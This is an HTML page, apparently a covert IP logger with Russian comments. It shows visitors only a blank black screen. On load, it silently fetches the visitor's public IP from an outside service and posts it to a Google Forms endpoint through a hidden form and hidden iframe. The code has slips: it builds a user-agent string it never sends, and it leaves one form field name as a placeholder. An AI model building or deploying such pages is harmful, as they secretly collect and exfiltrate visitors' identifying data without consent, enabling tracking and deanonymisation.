<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Name</title>
  <style>
    body {
      font-family: sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      background-color: #000;
      margin: 0;
    }
    #status {
      font-size: 50px;
      color: #fff;
      text-align: center;
      animation: blink 1s step-end infinite;
    }

    /* Мигающий текст */
    @keyframes blink {
      50% {
        opacity: 0;
      }
    }

    /* Скрытая форма */
    #sendForm {
      position: absolute;
      opacity: 0;
      pointer-events: none;
    }
  </style>
</head>
<body>
  <div id="status"></div>

  <form id="sendForm" action="https://docs.google.com/forms/d/e/1FAIpQLSdl5lqvGofH1jMMMTi9S50FlRw-Q7Jx1cYaPMPULo9lkfxu1A/formResponse" method="POST" target="hiddenFrame">
    <input name="entry.206479093" id="combinedInput" type="text">
    <input name="entry.XXXXXXX" id="ipInput" type="text"> <!-- Замените XXXXXX на правильное имя поля -->
  </form>

  <iframe name="hiddenFrame" style="display: none;" onload="document.getElementById('status').textContent = ''"></iframe>

  <script>
    const userAgent = navigator.userAgent;
    const currentTime = new Date().toLocaleString();
    
    // Функция для получения IP-адреса через API
    function getIpAndSubmitForm() {
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          const ipAddress = data.ip;

          // Объединяем информацию об устройстве и времени в одну строку
          const combinedInfo = `${userAgent} | ${currentTime}`;

          // Заполняем поля формы
          document.getElementById("combinedInput").value = ipAddress;
          document.getElementById("ipInput").value = ipAddress;

          // Отправляем форму
          document.getElementById('sendForm').submit();
        })
        .catch(error => {
          console.error('Ошибка при получении IP-адреса:', error);
        });
    }

    // Запускаем функцию для получения IP и отправки формы
    getIpAndSubmitForm();
  </script>
</body>
</html>
